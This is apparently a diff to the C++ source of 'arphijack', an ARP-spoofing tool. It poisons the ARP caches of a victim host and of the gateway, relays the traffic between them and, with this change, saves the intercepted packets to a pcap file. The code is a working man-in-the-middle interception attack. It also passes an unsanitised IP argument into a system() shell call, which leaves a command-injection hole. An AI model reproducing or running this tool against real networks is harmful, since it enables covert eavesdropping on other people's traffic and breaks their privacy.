@@ -25,33 +25,13 @@ using namespace std;
 
 namespace
 {
+	const unsigned int kSnapLen = 65535;
+
     char    g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
+    string	g_strFilename;
 };
 
-class FileSmartPtr
-{
-public:
-    FileSmartPtr() : m_pFile(NULL) {}
-    ~FileSmartPtr() { this->Close(); }
-    
-    void Attach(FILE* pFile) { this->Close(); }
-    
-    FILE* Get() const { return m_pFile; }
-    
-private:
-    void Close()
-    {
-        if (m_pFile)
-        {
-            fclose(m_pFile);
-            m_pFile = NULL;
-        }
-    }
-    
-    FILE*   m_pFile;
-};
-
-typedef struct
+typedef struct _WorkingSet
 {
     pcap_t* 		handle;
     u_char  		myMAC[ETH_ALEN];
@@ -59,8 +39,6 @@ typedef struct
     u_char  		gatewayMAC[ETH_ALEN];
     in_addr 		victimIP;
     in_addr 		gatewayIP;
-    bool    		bInitialClaimsMade;
-    FileSmartPtr 	file;
 } WorkingSet;
 
 typedef struct
@@ -75,6 +53,29 @@ typedef struct
     u_int8_t    targetMAC[ETH_ALEN];	/* Target hardware address.  */
     u_int16_t   targetIP[2];		    /* Target IP address.  */
 } ARPPacket;
+
+#ifndef pcap_hdr_t
+typedef struct pcap_hdr_s
+{
+	unsigned int 	magic_number;   /* magic number */
+	u_int16_t	 	version_major;  /* major version number */
+	u_int16_t	 	version_minor;  /* minor version number */
+	int		  	 	thiszone;       /* GMT to local correction */
+	unsigned int 	sigfigs;        /* accuracy of timestamps */
+	unsigned int 	snaplen;        /* max length of captured packets, in octets */
+	unsigned int 	network;        /* data link type */
+} pcap_hdr_t;
+#endif
+
+#ifndef pcaprec_hdr_t
+typedef struct pcaprec_hdr_s
+{
+    unsigned int 	ts_sec;         /* timestamp seconds */
+    unsigned int 	ts_usec;        /* timestamp microseconds */
+    unsigned int 	incl_len;       /* number of octets of packet saved in file */
+    unsigned int 	orig_len;       /* actual length of packet */
+} pcaprec_hdr_t;
+#endif
 
 #define MAC_FORMAT "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx"
 
@@ -120,7 +121,6 @@ int GetMACForIP(const char* ip, u_char macAddr[ETH_ALEN])
     }
     
     //This is to make sure there will be ARP entry for the IP
-    //TODO: Is this actually necessary?
     char cmd[100] = {0};
     sprintf(cmd, "ping -c1 %s > NIL", ip);
     system(cmd);
@@ -203,12 +203,12 @@ void HandleIPPacket(WorkingSet& ws,
     
     if (memcmp(pEth->ether_shost, ws.gatewayMAC, ETH_ALEN) == 0)
     {
-        printf("[IP] gateway -> victim\n");
+        printf("[IP]  gateway -> victim\n");
         COPY_OR_ZERO(pEth->ether_dhost, ws.victimMAC, ETH_ALEN);
     }
     else
     {
-        printf("[IP] victim  -> gateway\n");
+        printf("[IP]  victim  -> gateway\n");
         COPY_OR_ZERO(pEth->ether_dhost, ws.gatewayMAC, ETH_ALEN);
     }
       
@@ -297,22 +297,53 @@ int HandleARPPacket(WorkingSet& ws, const u_char* pPacket)
 	
 	in_addr tmp;
 	memcpy(&tmp, pARPPacket->targetIP, sizeof(in_addr));
+	char* szPacketIP = inet_ntoa(tmp);
 	
-	if (strcmp(inet_ntoa(ws.gatewayIP), inet_ntoa(tmp)) == 0)
+	if (strcmp(inet_ntoa(ws.gatewayIP), szPacketIP) == 0)
 	{
 		printf("[ARP] Victim: who is gateway?\n");
 		return ClaimIPAsOwn(ws, ws.gatewayIP, ws.victimIP, ws.victimMAC);
 	}
-	else if (strcmp(inet_ntoa(ws.victimIP), inet_ntoa(tmp)) == 0)
+	else if (strcmp(inet_ntoa(ws.victimIP), szPacketIP) == 0)
 	{
 		printf("[ARP] Gateway: who is victim?\n");
 		return ClaimIPAsOwn(ws, ws.victimIP, ws.gatewayIP, ws.gatewayMAC); 
 	}
 }
 
-int SavePacket(const WorkingSet& ws, const pcap_pkthdr* pHeader, const u_char* pPacket)
+int SavePacket(const pcap_pkthdr* pHeader, const u_char* pPacket)
 {
-	MY_ASSERT(ws.file.Get());
+   	FILE* pFile = fopen(g_strFilename.c_str(), "a");
+   	MY_ASSERT(pFile);
+	
+	pcaprec_hdr_t packetHeader;
+	packetHeader.ts_sec 	= pHeader->ts.tv_sec;
+	packetHeader.ts_usec 	= pHeader->ts.tv_usec;
+	packetHeader.incl_len 	= min(pHeader->caplen, kSnapLen);
+	packetHeader.orig_len 	= pHeader->len;
+	
+	fwrite(reinterpret_cast<const char*>(&packetHeader), 1, sizeof(packetHeader), pFile);
+	fwrite(reinterpret_cast<const char*>(pPacket), 1, pHeader->caplen, pFile);
+	
+	fclose(pFile);
+	
+	return 0;
+}
+
+int WriteGlobalHeader(FILE* pFile)
+{
+	MY_ASSERT(pFile);
+	
+	pcap_hdr_t globalHeader;
+	globalHeader.magic_number 	= 0xa1b2c3d4;
+	globalHeader.version_major 	= 2;
+	globalHeader.version_minor	= 4;
+	globalHeader.thiszone		= 0;
+	globalHeader.sigfigs		= 0;
+	globalHeader.snaplen		= kSnapLen;
+	globalHeader.network		= 1; //Ethernet
+	
+	fwrite(reinterpret_cast<const char*>(&globalHeader), 1, sizeof(globalHeader), pFile);
 	
 	return 0;
 }
@@ -330,23 +361,28 @@ void OnPacketArrival(u_char* args, const pcap_pkthdr* pHeader, const u_char* pPa
     	HandleIPPacket(*pWs, pPacket, pHeader->caplen);
     }
     
-    SavePacket(*pWs, pHeader, pPacket);
+    SavePacket(pHeader, pPacket);
+}
+
+void PrintInstructions()
+{
+    printf("Usage: arphijack [victim-ip] [options]\n");
+    printf("Options:\n");
+    printf("-d --device [dev]\n");
+    printf("  Listen to the [dev]. If not specified, will listen to a device with traffic.\n");
+    printf("-o --output [filename]\n");
+    printf("  Writes dump to [filename]. If not specified, will write to <dev>_<start-time>.pcap\n");
+    printf("-g --gateway [ip-addr]\n");
+    printf("  Treat [ip-addr] as the gateway. If not specified, will try to auto-detect.\n");
 }
 
 int main(int argc, char** argv)
 {
-    if (argc < 2)
-    {
-        printf("Usage: arphijack [victim-ip] [options]\n");
-        printf("Options:\n");
-        printf("-d --device [dev]\n");
-        printf("  Listen to the [dev]. If not specified, will listen to a device with traffic.\n");
-        printf("-o --output [filename]\n");
-        printf("  Writes dump to [filename]. If not specified, will write to <dev>_<start-time>.pcap\n");
-        printf("-g --gateway [ip-addr]\n");
-        printf("  Treat [ip-addr] as the gateway. If not specified, will try to auto-detect.\n");
-        return EXIT_FAILURE;
-    }
+	if (argc < 2)
+	{
+		PrintInstructions();
+		return EXIT_FAILURE;
+	}
 
     WorkingSet ws;
     memset(&ws, 0, sizeof(WorkingSet));
@@ -355,7 +391,6 @@ int main(int argc, char** argv)
     printf("Victim: %s\n", inet_ntoa(ws.victimIP));
     
     const char* szDevice   = NULL;
-    const char* szOutput   = NULL;
     
     for (uint8_t i=2; i<argc; i++)
     {
@@ -363,7 +398,7 @@ int main(int argc, char** argv)
             szDevice = argv[++i];
             
         if (strcmp(argv[i], "-o") == 0 || strcmp(argv[i], "--output") == 0)
-            szOutput = argv[++i];
+            g_strFilename = argv[++i];
     }
 
     if (!szDevice)
@@ -402,6 +437,14 @@ int main(int argc, char** argv)
     MY_ASSERT(pcap_compile(ws.handle, &fp, filter.c_str(), 0, net) != -1);
     
     MY_ASSERT(pcap_setfilter(ws.handle, &fp) != -1);
+    
+    if (g_strFilename.empty())
+    	g_strFilename = "capture.pcap";
+    	
+   	FILE* pFile = fopen(g_strFilename.c_str(), "w");
+   	MY_ASSERT(pFile);
+    WriteGlobalHeader(pFile);
+    fclose(pFile);
     
     ClaimIPAsOwn(ws, ws.gatewayIP, ws.victimIP, ws.victimMAC);
     ClaimIPAsOwn(ws, ws.victimIP, ws.gatewayIP, ws.gatewayMAC);
